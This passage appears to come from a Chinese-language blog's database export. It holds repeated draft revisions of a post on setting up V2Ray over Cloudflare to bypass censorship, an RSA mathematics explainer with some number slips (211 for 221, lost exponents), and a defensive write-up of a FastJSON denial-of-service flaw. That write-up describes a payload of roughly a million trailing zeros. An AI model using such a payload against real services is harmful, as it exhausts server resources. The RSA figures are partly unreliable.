08:00:10"},{"id":"5d872a203faccd0001d05343","post_id":"5d6bcbeb3faccd0001d04fb6","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"markdown\",{\"markdown\":\"之前一直在自己的VPS搭建`Shadowsocks`服务端做梯子, 不过在一些政治敏感时期, 墙的力度会增强, 甚至我发现Vultr的所有IP几乎都直接被墙了\\n\\n经过了解, 决定改用`V2Ray`搭建一个新的梯子. 我觉得`V2Ray`最牛逼的一个点是可以将流量伪装成Websocket并通过Cloudflare(CDN)来代理, 而CDN整个被墙掉的概率很低的 ...\\n\\n建议使用[这个项目](https://github.com/233boy/v2ray)来搭建V2Ray服务端, 非常好用\\n\\n速度可以接受, Google查个资料, YouTube看个视频还是可以没问题的\"}]],\"markups\":[],\"sections\":[[10,0],[1,\"p\",[]]]}","created_at_ts":1569139232658,"created_at":"2019-09-22 08:00:32"},{"id":"5d872a2e3faccd0001d05345","post_id":"5d6bcbeb3faccd0001d04fb6","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"markdown\",{\"markdown\":\"之前一直在自己的VPS搭建`Shadowsocks`服务端做梯子, 不过在一些政治敏感时期, 墙的力度会增强, 甚至我发现Vultr的所有IP几乎都直接被墙了\\n\\n经过了解, 决定改用`V2Ray`搭建一个新的梯子. 我觉得`V2Ray`最牛逼的一个点是可以将流量伪装成Websocket并通过Cloudflare(CDN)来代理, 而CDN整个被墙掉的概率很低的 ...\\n\\n建议使用[这个项目](https://github.com/233boy/v2ray)来搭建V2Ray服务端, 非常好用\\n\\n速度可以接受, Google查个资料, YouTube看个视频没问题的\"}]],\"markups\":[],\"sections\":[[10,0],[1,\"p\",[]]]}","created_at_ts":1569139246482,"created_at":"2019-09-22 08:00:46"},{"id":"5d872a323faccd0001d05347","post_id":"5d6bcbeb3faccd0001d04fb6","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"markdown\",{\"markdown\":\"之前一直在自己的VPS搭建`Shadowsocks`服务端做梯子, 不过在一些政治敏感时期, 墙的力度会增强, 甚至我发现Vultr的所有IP几乎都直接被墙了\\n\\n经过了解, 决定改用`V2Ray`搭建一个新的梯子. 我觉得`V2Ray`最牛逼的一个点是可以将流量伪装成Websocket并通过Cloudflare(CDN)来代理, 而CDN整个被墙掉的概率很低的 ...\\n\\n建议使用[这个项目](https://github.com/233boy/v2ray)来搭建V2Ray服务端, 非常好用\\n\\n速度可以接受, Google查个资料, YouTube看个视频基本没问题的\"}]],\"markups\":[],\"sections\":[[10,0],[1,\"p\",[]]]}","created_at_ts":1569139250380,"created_at":"2019-09-22 08:00:50"},{"id":"5d872a3f3faccd0001d05349","post_id":"5d6bcbeb3faccd0001d04fb6","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"markdown\",{\"markdown\":\"之前一直在自己的VPS搭建`Shadowsocks`服务端做梯子, 不过在一些政治敏感时期, 墙的力度会增强, 甚至我发现Vultr的所有IP几乎都直接被墙了\\n\\n经过了解, 决定改用`V2Ray`搭建一个新的梯子. 我觉得`V2Ray`最牛逼的一个点是可以将流量伪装成Websocket并通过Cloudflare(CDN)来代理, 而CDN整个被墙掉的概率很低的 ...\\n\\n建议使用[这个项目](https://github.com/233boy/v2ray)来搭建V2Ray服务端, 非常好用\\n\\n速度方面可以接受, Google查个资料, YouTube看个视频基本还是没问题的\"}]],\"markups\":[],\"sections\":[[10,0],[1,\"p\",[]]]}","created_at_ts":1569139263722,"created_at":"2019-09-22 08:01:03"},{"id":"5d872a7d3faccd0001d0534c","post_id":"5d6bcbeb3faccd0001d04fb6","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"markdown\",{\"markdown\":\"之前一直在自己的VPS搭建`Shadowsocks`服务端做梯子, 不过在一些政治敏感时期, 墙的力度会增强, 前段时间我发现Vultr的所有IP几乎都直接被墙了\\n\\n经过了解, 决定改用`V2Ray`搭建一个新的梯子. 我觉得`V2Ray`最牛逼的一个点是可以将流量伪装成Websocket并通过Cloudflare(CDN)来代理, 而CDN整个被墙掉的概率很低的 ...\\n\\n建议使用[这个项目](https://github.com/233boy/v2ray)来搭建V2Ray服务端, 非常好用\\n\\n速度方面可以接受, Google查个资料, YouTube看个视频基本还是没问题的\"}]],\"markups\":[],\"sections\":[[10,0],[1,\"p\",[]]]}","created_at_ts":1569139325800,"created_at":"2019-09-22 08:02:05"},{"id":"5d9ef4af3faccd0001d05355","post_id":"5d7b12173faccd0001d04fc3","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"markdown\",{\"markdown\":\"> 原文链接 [跨越千年的RSA算法](https://www.matrix67.com/blog/archives/5100)\"}],[\"markdown\",{\"markdown\":\"在当今这个由互联网构筑的世界里, RSA算法几乎无处不在. 例如:\\n\\n* 访问任何一个`https`证书加密的网站\\n* 通过SSH登录一台服务器\\n* 从GitHub上clone一个项目\\n\\n说来惭愧, 作为一个每天和`RSA算法`打交道的程序员, 直到最近学习了`Matrix67`大神讲解RSA算法的博客我才终于理解`RSA算法`到底是怎么一回事. 在真正介绍`RSA算法`之前作者用了大量的篇幅为读者填补了必要的数学基础, 文章共分为六个小节, 真正提到`RSA算法`的只有最后一个小节, 我之前也看过一两篇其他介绍`RSA算法`的文章, 但唯有这一次让我有种豁然开朗的感觉.\\n\"}],[\"markdown\",{\"markdown\":\"### （一）可公度线段\\n\\n文章介绍了在<几何原本>中一种求取最大公约数的方法(Euclid 算法): 假设刚开始的两个数是 a 和 b ，其中 a > b ，那么把 a 除以 b 的余数记作 c ，把 b 除以 c 的余数记作 d ，c 除以 d 余 e ， d 除以 e 余 f ，等等等等，不断拿上一步的除数去除以上一步的余数。直到某一次除法余数为 0 了，那么此时的除数就是最终结果。因此， Euclid 算法又有一个形象的名字，叫做 `辗转相除法`\"}],[\"markdown\",{\"markdown\":\"###（二）中国剩余定理\\n\\n给出 m 个两两互质的整数，它们的乘积为 P, 假设有一个未知数 M, 如果我们已知 M 分别除以这 m 个数所得的余数, 那么在 0 到 P – 1 的范围内, 我们可以唯一地确定这个 M, 这可以看作是 M 的一个特解. 其他所有满足要求的 M ，则正好是那些除以 P 之后余数等于这个特解的数。\\n\\n`Bézout 定理` 是中国剩余定理的另一种形式. 如果 a 和 n 互质, 那么\\n\\n```\\n  a * x mod n = 1\\n  a * x mod n = 2 \\n  ...\\n  a * x mod n = n-1 \\n```\\n\\n以上所有方程都是有解的\\n\\n如果将第一个等式换成 `中国剩余定理` 的表达, 则可以表达描述为: a 和 n 互质, 那么在 0 到 a*n - 1 的范围内一定存在唯一的M, 使:\\n\\n```\\nM mod a = 0\\nM mod n = 1\\n```\\n\\n这里的 M 相当于上面的 `a * x`\"}],[\"markdown\",{\"markdown\":\"###（三）扩展的辗转相除\\n\\n根据中国剩余定理, 我们可以指定在 0 到 P-1 之间 M 一定有唯一解, 那么如何在已知m和余数的条件下求出这个M呢 ? 这就是 `扩展的辗转相除法`\\n\\n现在, 让我们尝试求解 115x mod 367 = 1, 根据中国剩余定理(或者说Bézout 定理), 由于 115 和 367 是互质的, 因此方程在 0 到 115 * 367 - 1 之间一定存在唯一解.\\n\\n我们解方程的基本思路是，不断寻找 115 的某个倍数以及 367 的某个倍数, 使得它们之间的差越来越小，直到最终变为 1.\\n\\n```\\n由 367 除以 115 得 3 余 22, \\n即 3 个 115 只比 367 少 22, \\n于是 15 个 115 就要比 5 个 367 少 110, \\n从而 16 个 115 就会比 5 个 367 多 5.\\n```\\n\\n好了，真正巧妙的就在这里了: \\n\\n```\\n由 16 个 115 比 5 个 367 多 5, \\n可得 64 个 115 比 20 个 367 多 20\\n结合 3 个 115 比 1 个 367 少 22,\\n可得 67 个 115 比 21 个 367 少 2. \\n```\\n\\n再结合 \\\"少 2\\\" 和 \\\"多 5\\\" 两个式子，\\n\\n```\\n由 67 个 115 比 21 个 367 少 2, \\n可得 134 个 115 比 42 个 367 少 4, \\n结合 16 个 115 比 5 个 367 多 5, \\n可得 150 个 115 比 47 个 367 多 1. \\n```\\n\\n这样，我们就解出了一个满足 115x mod 367 = 1 的 x , 即 x = 150. \\n\\n在求解过程, 我们相当于对 115 和 367 做了一遍辗转相除: 我们不断给出 115 的某个倍数和 367 的某个倍数, 通过辗转对比最近的两个结果, 让它们的差距从\\\"少 22\\\"缩小到\\\"多 5\\\", 再到\\\"少 2\\\", \\\"多 1\\\", 其中 22, 5, 2, 1 这几个数正是用辗转相除法求 115 和 367 的最大公约数时将会经历的数. 因而, 算法的步骤数仍然是对数级别的, 即使面对上百位上千位的大数, 计算机也毫无压力. \\n\\n这种求解方程 a · x mod n = b 的算法就叫做“扩展的辗转相除法”。\"}],[\"markdown\",{\"markdown\":\"### （四）Fermat 小定理\\n\\n1640 年, 法国业余数学家 Pierre de Fermat(通常译作\\\"费马\\\")发现, 如果 n 是一个质数的话, 那么对于任意一个数 a, a 的 n 次方减去 a 之后都将是 n 的倍数. 例如, 7 是一个质数, 于是 27 – 2, 37 – 3, 47 – 4, 甚至 1007 – 100, 统统都能被 7 整除. 关于费马小定理的证明, 读者可以参见原文.\\n\\nFermat 小定理有一个等价的表述: 如果 n 是一个质数的话, 那么对于任意一个数 a, 随着 i 的增加, a 的 i 次方除以 n 的余数将会呈现出长度为 n – 1 的周期性. \\n\\n为什么呢?\\n\\n根据费马小定理, a^n 与 a 的差能够被 n 整除, 这相当于 a^n 和 a 分别都除以 n 之后将会拥有相同的余数. 另一方面, a^i 除以 n 的余数, 完全由 a^i-1 除以 n 的余数决定, 比方说, 假如我们已经知道 33 除以 7 等于 3 余 6, 这表明 33 里包含 3 个 7 以及 1 个 6. 因此, 34 里就包含 9 个 7 以及 3 个 6, 或者说 9 个 7 以及 1 个 18. 为了得到 34 除以 7 的余数，实际上只需要看看 18 除以 7 余多少就行了. 可见, 要想算出 a^i-1 · a 除以 n 的余数，我们不需要完整地知道 a^i-1 的值, 只需要知道 a^i-1 除以 n 的余数就可以了\\n\\n*重点* 相乘之前事先对乘数取余不会对结果造成影响, 可用数学表达式表示为:\\n\\n```\\n(a * b) % p = (a % p * b % p) % p\\n```\\n\\n这也是取模运算的基本运算法则\\n\\n\\n值得注意的是, n – 1 并不见得是最小的周期. 如 2^i 除以 7 的余数情况, 余数序列确实存在长度为 6 的周期现象, 但实际上它有一个更小的周期 3.\\n\\n假如某个整数 n 等于两个质数 p, q 的乘积，那么对于任意一个整数 a ，写出 a^i 依次除以 n 所得的余数序列, p – 1 和 q – 1 的最小公倍数将成为该序列的一个周期. 事实上， p – 1 和 q – 1 的任意一个公倍数, 比如表达起来最方便的 (p – 1) × (q – 1), 也将成为该序列的一个周期.\"}],[\"markdown\",{\"markdown\":\"### （五）公钥加密的可能性\\n\\n加密算法和解密算法有可能是不对称的吗？\\n\\n小时候我经常在朋友之间表演这么一个数学小魔术: 让对方任意想一个三位数, 把这个三位数乘以 91 的乘积的末三位告诉我, 我便能猜出对方原来想的数是多少. 如果对方心里想的数是 123, 那么对方就计算出 123 × 91 等于 11193, 并把结果的末三位 193 告诉我. 看起来, 这么做似乎损失了不少信息, 让我没法反推出原来的数. 不过, 我仍然有办法: 只需要把对方告诉我的结果再乘以 11, 乘积的末三位就是对方刚开始想的数了. 你可以验证一下， 193 × 11 = 2123 ，末三位正是对方所想的秘密数字! 其实道理很简单, 91 乘以 11 等于 1001, 而任何一个三位数乘以 1001 后, 末三位显然都不变（例如 123 乘以 1001 就等于 123123 ）. 先让对方在他所想的数上乘以 91, 假设乘积为 X, 我再在 X 的基础上乘以 11, 其结果相当于我俩合作把原数乘以了 1001, 自然末三位又变了回去.\\n\\n不过, 加密和解密的过程不对称并不妨碍我们根据加密方法推出解密方法来, 虽然这可能得费些功夫. 比方说, 刚才的加密算法就能被破解: 猜出对方心里想的数相当于求解形如 91x mod 1000 = 193 的方程, 这可以利用扩展的辗转相除法很快求解出来. \\n\\n为了得到一个可以公开加密钥匙的算法, 我们需要一种在只知道加密钥匙的情况下, 构造出解密钥匙非常非常困难的算法。\\n\\n1970 年左右，科学家们开始认真地思考“公钥加密系统”的可能性。 1977 年，来自 MIT 的 Ron Rivest 、 Adi Shamir 和 Leonard Adleman 三个人合写了一篇论文，给出了一种至今仍然安全的公钥加密算法。随后，该算法以三人名字的首字母命名，即 RSA 算法。\\n\\nRSA 算法用到了一种非常犀利的不对称性——大数分解难题.\\n\\n这种不对称性的点在于, 我们可以很容易的判断一个数是否是质数(稍后会讲到), 进而可以很容易的生成一个很大的质数, 但是到目前为止, 我们却没有一种高效的方法, 判断将一个大数分解成两个质数的乘积.\\n\\n判断一个数是否是质数的方法, 可以搜索以下内容: \\n\\n```\\n Fermat 素性测试\\n Miller-Rabin 素性测试\\n AKS 素性测试\\n```\"}],[\"markdown\",{\"markdown\":\"### （六）RSA 算法\\n\\n 所有工作都准备就绪, 下面我们可以开始描述 RSA 算法了.\\n \\n  首先, 找两个质数, 比如说 13 和 17 (实际使用时, 我们会选取大得多的质数). 把它们乘在一起, 得 221. 再计算出 (13 – 1) × (17 – 1) = 192. 根据前面的结论, 任选一个数 a, 它的 i 次方除以 221 的余数将会呈现长度为 192 的周期(虽然可能存在更短的周期). 换句话说, 对于任意的一个 a, a, a^193, a^385, a^577 ... 除以 221 都拥有相同的余数. 注意到, 385 可以写成 11 × 35 ... 嘿嘿，这下我们就又能变数学小魔术了. 叫一个人随便想一个不超过 221 的数，比如 123. 算出 123 的 11 次方除以 221 的余数, 把结果告诉你. 如果他的计算是正确的, 你将会得到 115 这个数. 看上去, 我们似乎很难把 115 还原回去, 但实际上你只需要计算 115 的 35 次方, 它除以 221 的余数就会变回 123. 这是因为, 对方把他所想的数 123 连乘了 11 次, 得到了一个数 X, 你再把这个 X 乘以自身 35 次, 这相当于你们合作把 123 连乘了 385 次, 根据周期性现象, 它除以 221 的余数仍然是 123. 然而, 计算 35 个 X 连乘时, 反正我们要取乘积除以 221 的余数, 因此我们不必完整地获知 X 的值, 只需要知道 X 除以 221 的余数就够了. 因而, 让对方只告诉你 X 取余后的结果, 不会造成信息的丢失.\\n  \\n让我们试想一下, 现在可以公开获取到的信息有 211 和 11, 如果攻击者想要解密数据就必须知道原数据的i次方对211取模的循环周期是多少(即192). 假设 211 是一个很大的数, 我们几乎没有办法把 221 分解成 13 和 17 的乘积. \\n\\n而作为生成秘钥对的一方, 我们知道 211 = 13 * 17, 进而知道原数据的i次方对211取模的循环周期是192, 那么现在, 我们要找出两个数 e 和 d ，使得 e 乘以 d 的结果除以 192 余 1 应该怎么做呢 ? \\n\\n还记得 `中国剩余定理` 吗? \\n\\n上面的问题可以写成数学表达式 `e · d mod 192 = 1`\\n\\n首先, 我们随便找一个和 192 互质的数 (这是可以做到的, 比方说, 可以不断生成小于 192 的质数, 直到找到一个不能整除 192 的为止），把它用作我们的 e (比如 11). 我们知道, 因为 11 和 192 互质, d 的解一定是存在的. \\n\\n让我们用 `扩展的辗转相除法` 再推导一次吧 !\\n\\n```\\n因为 192 除以 11 商 17 余 5,\\n即 17个11 比 1个192 少 5,\\n且 18个11 比 1个192 多 6,\\n那么, 35个11 比 2个192 多 1, 即 11 * 35 除以 192 商 2 余 1\\n```\\n\\n这正是我们需要的结果! d = 35\\n\\n现在, e 和 n 就可以作为加密钥匙公之于众, d 和 n 则是只有自己知道的解密钥匙. 因而，加密钥匙有时也被称作公钥, 解密钥匙有时也被称作私钥. 这就是RSA算法背后的数学原理了, 更多关于RSA算法计算过程中的优化细节可以阅读原文, 也非常我们值得仔细思考.\\n\\n<几何原本> 约于公元前300年由古希腊数学家 `欧几里得` 所著. 伟大的数学思想穿越2300多年的时空, 在今天这个互联网的时代大放异彩.\"}],[\"image\",{\"src\":\"/content/images/2019/09/----.jpg\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[10,3],[10,4],[10,5],[10,6],[10,7],[10,8],[1,\"p\",[]]]}","created_at_ts":1570698415266,"created_at":"2019-10-10 09:06:55"},{"id":"5d9efb423faccd0001d05357","post_id":"5d7b12173faccd0001d04fc3","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"markdown\",{\"markdown\":\"> 原文链接 [跨越千年的RSA算法](https://www.matrix67.com/blog/archives/5100)\"}],[\"markdown\",{\"markdown\":\"在当今这个由互联网构筑的世界里, RSA算法几乎无处不在. 例如:\\n\\n* 访问任何一个`https`证书加密的网站\\n* 通过SSH登录一台服务器\\n* 从GitHub上clone一个项目\\n\\n说来惭愧, 作为一个每天和`RSA算法`打交道的程序员, 直到最近学习了`Matrix67`大神讲解RSA算法的博客我才终于理解`RSA算法`到底是怎么一回事. 在真正介绍`RSA算法`之前作者用了大量的篇幅为读者填补了必要的数学基础, 文章共分为六个小节, 真正提到`RSA算法`的只有最后一个小节, 我之前也看过一两篇其他介绍`RSA算法`的文章, 但唯有这一次让我有种豁然开朗的感觉.\\n\"}],[\"markdown\",{\"markdown\":\"### （一）可公度线段\\n\\n文章介绍了在<几何原本>中一种求取最大公约数的方法(Euclid 算法): 假设刚开始的两个数是 a 和 b ，其中 a > b ，那么把 a 除以 b 的余数记作 c ，把 b 除以 c 的余数记作 d ，c 除以 d 余 e ， d 除以 e 余 f ，等等等等，不断拿上一步的除数去除以上一步的余数。直到某一次除法余数为 0 了，那么此时的除数就是最终结果。因此， Euclid 算法又有一个形象的名字，叫做 `辗转相除法`\"}],[\"markdown\",{\"markdown\":\"###（二）中国剩余定理\\n\\n给出 m 个两两互质的整数，它们的乘积为 P, 假设有一个未知数 M, 如果我们已知 M 分别除以这 m 个数所得的余数, 那么在 0 到 P – 1 的范围内, 我们可以唯一地确定这个 M, 这可以看作是 M 的一个特解. 其他所有满足要求的 M ，则正好是那些除以 P 之后余数等于这个特解的数。\\n\\n`Bézout 定理` 是中国剩余定理的另一种形式. 如果 a 和 n 互质, 那么\\n\\n```\\n  a * x mod n = 1\\n  a * x mod n = 2 \\n  ...\\n  a * x mod n = n-1 \\n```\\n\\n以上所有方程都是有解的\\n\\n如果将第一个等式换成 `中国剩余定理` 的表达, 则可以表达描述为: a 和 n 互质, 那么在 0 到 a*n - 1 的范围内一定存在唯一的M, 使:\\n\\n```\\nM mod a = 0\\nM mod n = 1\\n```\\n\\n这里的 M 相当于上面的 `a * x`\"}],[\"markdown\",{\"markdown\":\"###（三）扩展的辗转相除\\n\\n根据中国剩余定理, 我们可以指定在 0 到 P-1 之间 M 一定有唯一解, 那么如何在已知m和余数的条件下求出这个M呢 ? 这就是 `扩展的辗转相除法`\\n\\n现在, 让我们尝试求解 115x mod 367 = 1, 根据中国剩余定理(或者说Bézout 定理), 由于 115 和 367 是互质的, 因此方程在 0 到 115 * 367 - 1 之间一定存在唯一解.\\n\\n我们解方程的基本思路是，不断寻找 115 的某个倍数以及 367 的某个倍数, 使得它们之间的差越来越小，直到最终变为 1.\\n\\n```\\n由 367 除以 115 得 3 余 22, \\n即 3 个 115 只比 367 少 22, \\n于是 15 个 115 就要比 5 个 367 少 110, \\n从而 16 个 115 就会比 5 个 367 多 5.\\n```\\n\\n好了，真正巧妙的就在这里了: \\n\\n```\\n由 16 个 115 比 5 个 367 多 5, \\n可得 64 个 115 比 20 个 367 多 20\\n结合 3 个 115 比 1 个 367 少 22,\\n可得 67 个 115 比 21 个 367 少 2. \\n```\\n\\n再结合 \\\"少 2\\\" 和 \\\"多 5\\\" 两个式子，\\n\\n```\\n由 67 个 115 比 21 个 367 少 2, \\n可得 134 个 115 比 42 个 367 少 4, \\n结合 16 个 115 比 5 个 367 多 5, \\n可得 150 个 115 比 47 个 367 多 1. \\n```\\n\\n这样，我们就解出了一个满足 115x mod 367 = 1 的 x , 即 x = 150. \\n\\n在求解过程, 我们相当于对 115 和 367 做了一遍辗转相除: 我们不断给出 115 的某个倍数和 367 的某个倍数, 通过辗转对比最近的两个结果, 让它们的差距从\\\"少 22\\\"缩小到\\\"多 5\\\", 再到\\\"少 2\\\", \\\"多 1\\\", 其中 22, 5, 2, 1 这几个数正是用辗转相除法求 115 和 367 的最大公约数时将会经历的数. 因而, 算法的步骤数仍然是对数级别的, 即使面对上百位上千位的大数, 计算机也毫无压力. \\n\\n这种求解方程 a · x mod n = b 的算法就叫做“扩展的辗转相除法”。\"}],[\"markdown\",{\"markdown\":\"### （四）Fermat 小定理\\n\\n1640 年, 法国业余数学家 Pierre de Fermat(通常译作\\\"费马\\\")发现, 如果 n 是一个质数的话, 那么对于任意一个数 a, a 的 n 次方减去 a 之后都将是 n 的倍数. 例如, 7 是一个质数, 于是 2^7 – 2, 3^7 – 3, 4^7 – 4, 甚至 100^7 – 100, 统统都能被 7 整除. 关于费马小定理的证明, 读者可以参见原文.\\n\\nFermat 小定理有一个等价的表述: 如果 n 是一个质数的话, 那么对于任意一个数 a, 随着 i 的增加, a 的 i 次方除以 n 的余数将会呈现出长度为 n – 1 的周期性. \\n\\n为什么呢?\\n\\n根据费马小定理, a^n 与 a 的差能够被 n 整除, 这相当于 a^n 和 a 分别都除以 n 之后将会拥有相同的余数. 另一方面, a^i 除以 n 的余数, 完全由 a^i-1 除以 n 的余数决定, 比方说, 假如我们已经知道 33 除以 7 等于 3 余 6, 这表明 33 里包含 3 个 7 以及 1 个 6. 因此, 34 里就包含 9 个 7 以及 3 个 6, 或者说 9 个 7 以及 1 个 18. 为了得到 34 除以 7 的余数，实际上只需要看看 18 除以 7 余多少就行了. 可见, 要想算出 a^i-1 · a 除以 n 的余数，我们不需要完整地知道 a^i-1 的值, 只需要知道 a^i-1 除以 n 的余数就可以了\\n\\n*重点* 相乘之前事先对乘数取余不会对结果造成影响, 可用数学表达式表示为:\\n\\n```\\n(a * b) % p = (a % p * b % p) % p\\n```\\n\\n这也是取模运算的基本运算法则\\n\\n\\n值得注意的是, n – 1 并不见得是最小的周期. 如 2^i 除以 7 的余数情况, 余数序列确实存在长度为 6 的周期现象, 但实际上它有一个更小的周期 3.\\n\\n假如某个整数 n 等于两个质数 p, q 的乘积，那么对于任意一个整数 a ，写出 a^i 依次除以 n 所得的余数序列, p – 1 和 q – 1 的最小公倍数将成为该序列的一个周期. 事实上， p – 1 和 q – 1 的任意一个公倍数, 比如表达起来最方便的 (p – 1) × (q – 1), 也将成为该序列的一个周期.\"}],[\"markdown\",{\"markdown\":\"### （五）公钥加密的可能性\\n\\n加密算法和解密算法有可能是不对称的吗？\\n\\n小时候我经常在朋友之间表演这么一个数学小魔术: 让对方任意想一个三位数, 把这个三位数乘以 91 的乘积的末三位告诉我, 我便能猜出对方原来想的数是多少. 如果对方心里想的数是 123, 那么对方就计算出 123 × 91 等于 11193, 并把结果的末三位 193 告诉我. 看起来, 这么做似乎损失了不少信息, 让我没法反推出原来的数. 不过, 我仍然有办法: 只需要把对方告诉我的结果再乘以 11, 乘积的末三位就是对方刚开始想的数了. 你可以验证一下， 193 × 11 = 2123 ，末三位正是对方所想的秘密数字! 其实道理很简单, 91 乘以 11 等于 1001, 而任何一个三位数乘以 1001 后, 末三位显然都不变（例如 123 乘以 1001 就等于 123123 ）. 先让对方在他所想的数上乘以 91, 假设乘积为 X, 我再在 X 的基础上乘以 11, 其结果相当于我俩合作把原数乘以了 1001, 自然末三位又变了回去.\\n\\n不过, 加密和解密的过程不对称并不妨碍我们根据加密方法推出解密方法来, 虽然这可能得费些功夫. 比方说, 刚才的加密算法就能被破解: 猜出对方心里想的数相当于求解形如 91x mod 1000 = 193 的方程, 这可以利用扩展的辗转相除法很快求解出来. \\n\\n为了得到一个可以公开加密钥匙的算法, 我们需要一种在只知道加密钥匙的情况下, 构造出解密钥匙非常非常困难的算法。\\n\\n1970 年左右，科学家们开始认真地思考“公钥加密系统”的可能性。 1977 年，来自 MIT 的 Ron Rivest 、 Adi Shamir 和 Leonard Adleman 三个人合写了一篇论文，给出了一种至今仍然安全的公钥加密算法。随后，该算法以三人名字的首字母命名，即 RSA 算法。\\n\\nRSA 算法用到了一种非常犀利的不对称性——大数分解难题.\\n\\n这种不对称性的点在于, 我们可以很容易的判断一个数是否是质数(稍后会讲到), 进而可以很容易的生成一个很大的质数, 但是到目前为止, 我们却没有一种高效的方法, 判断将一个大数分解成两个质数的乘积.\\n\\n判断一个数是否是质数的方法, 可以搜索以下内容: \\n\\n```\\n Fermat 素性测试\\n Miller-Rabin 素性测试\\n AKS 素性测试\\n```\"}],[\"markdown\",{\"markdown\":\"### （六）RSA 算法\\n\\n 所有工作都准备就绪, 下面我们可以开始描述 RSA 算法了.\\n \\n  首先, 找两个质数, 比如说 13 和 17 (实际使用时, 我们会选取大得多的质数). 把它们乘在一起, 得 221. 再计算出 (13 – 1) × (17 – 1) = 192. 根据前面的结论, 任选一个数 a, 它的 i 次方除以 221 的余数将会呈现长度为 192 的周期(虽然可能存在更短的周期). 换句话说, 对于任意的一个 a, a, a^193, a^385, a^577 ... 除以 221 都拥有相同的余数. 注意到, 385 可以写成 11 × 35 ... 嘿嘿，这下我们就又能变数学小魔术了. 叫一个人随便想一个不超过 221 的数，比如 123. 算出 123 的 11 次方除以 221 的余数, 把结果告诉你. 如果他的计算是正确的, 你将会得到 115 这个数. 看上去, 我们似乎很难把 115 还原回去, 但实际上你只需要计算 115 的 35 次方, 它除以 221 的余数就会变回 123. 这是因为, 对方把他所想的数 123 连乘了 11 次, 得到了一个数 X, 你再把这个 X 乘以自身 35 次, 这相当于你们合作把 123 连乘了 385 次, 根据周期性现象, 它除以 221 的余数仍然是 123. 然而, 计算 35 个 X 连乘时, 反正我们要取乘积除以 221 的余数, 因此我们不必完整地获知 X 的值, 只需要知道 X 除以 221 的余数就够了. 因而, 让对方只告诉你 X 取余后的结果, 不会造成信息的丢失.\\n  \\n让我们试想一下, 现在可以公开获取到的信息有 211 和 11, 如果攻击者想要解密数据就必须知道原数据的i次方对211取模的循环周期是多少(即192). 假设 211 是一个很大的数, 我们几乎没有办法把 221 分解成 13 和 17 的乘积. \\n\\n而作为生成秘钥对的一方, 我们知道 211 = 13 * 17, 进而知道原数据的i次方对211取模的循环周期是192, 那么现在, 我们要找出两个数 e 和 d ，使得 e 乘以 d 的结果除以 192 余 1 应该怎么做呢 ? \\n\\n还记得 `中国剩余定理` 吗? \\n\\n上面的问题可以写成数学表达式 `e · d mod 192 = 1`\\n\\n首先, 我们随便找一个和 192 互质的数 (这是可以做到的, 比方说, 可以不断生成小于 192 的质数, 直到找到一个不能整除 192 的为止），把它用作我们的 e (比如 11). 我们知道, 因为 11 和 192 互质, d 的解一定是存在的. \\n\\n让我们用 `扩展的辗转相除法` 再推导一次吧 !\\n\\n```\\n因为 192 除以 11 商 17 余 5,\\n即 17个11 比 1个192 少 5,\\n且 18个11 比 1个192 多 6,\\n那么, 35个11 比 2个192 多 1, 即 11 * 35 除以 192 商 2 余 1\\n```\\n\\n这正是我们需要的结果! d = 35\\n\\n现在, e 和 n 就可以作为加密钥匙公之于众, d 和 n 则是只有自己知道的解密钥匙. 因而，加密钥匙有时也被称作公钥, 解密钥匙有时也被称作私钥. 这就是RSA算法背后的数学原理了, 更多关于RSA算法计算过程中的优化细节可以阅读原文, 也非常我们值得仔细思考.\\n\\n<几何原本> 约于公元前300年由古希腊数学家 `欧几里得` 所著. 伟大的数学思想穿越2300多年的时空, 在今天这个互联网的时代大放异彩.\"}],[\"image\",{\"src\":\"/content/images/2019/09/----.jpg\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[10,3],[10,4],[10,5],[10,6],[10,7],[10,8],[1,\"p\",[]]]}","created_at_ts":1570700098015,"created_at":"2019-10-10 09:34:58"},{"id":"5ddb4d212ee0ee0001818fb5","post_id":"5ddb49c22ee0ee0001818fa1","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"markdown\",{\"markdown\":\"背景\\n\\n近日, 慢雾安全平台的白帽子提交了一个安全漏洞:\\n\\n向某个参数类型为Integer的POST接口提交如 1.00...00 (小数点后约100万个0), 服务端程序处理该请求消耗了约90秒的时间, 耗费了大量的计算资源, 对于服务端程序来说, 这是不可接受的, 攻击者可以利用该漏洞对服务器发起DOS攻击\\n\\n攻击请求样例见附件\\n\\n\\n\\n分析\\n\\n根据白帽子提供的细心我在测试环境对该问题进行了复现并通过JProfiler分析了请求链路, 结果如下 : \\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\"}],[\"image\",{\"src\":\"/content/images/2019/11/1.png\"}],[\"image\",{\"src\":\"/content/images/2019/11/2.png\"}],[\"markdown\",{\"markdown\":\"可见, 绝大部分的计算资源用在了将数据解析为BigDecimal. 可是为什么参数类型明明是Integer却被解析成了BigDecimal ?\\n\\n我结合FastJSON源码做了进一步的分析, 发现FastJSON在解析Integer过程中会先判断数据的格式, 如果数据格式是小数, FastJSON会先将数据解析为BigDecimal , 再通过类型转换把BigDecimal转成Integer, 而正是这样的设计导致了这次的问题.\\n\\n对比同类库Jackson和GSON, 在将相同数据转换成Integer时并没有以上问题. 我认为这可能是FastJSON在设计时考虑不周的一个点\\n\\n\\n\\n解决方案\\na. 在运维层面, 根据接口实际需要对请求参数大小进行限制, 除数据上传等提交数据较大的接口之外外, 将入参数据大小限制在 10K 内\\n\\nb. 编写自定义Integer解析器替代默认的Integer解析器, 在将格式为小数的数据解析为Integer时, 用Double替代BigDecimal以规避潜在的安全(DOS)风险, 相关代码如下 \\n\\n\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[10,3],[1,\"p\",[]]]}","created_at_ts":1574653217934,"created_at":"2019-11-25 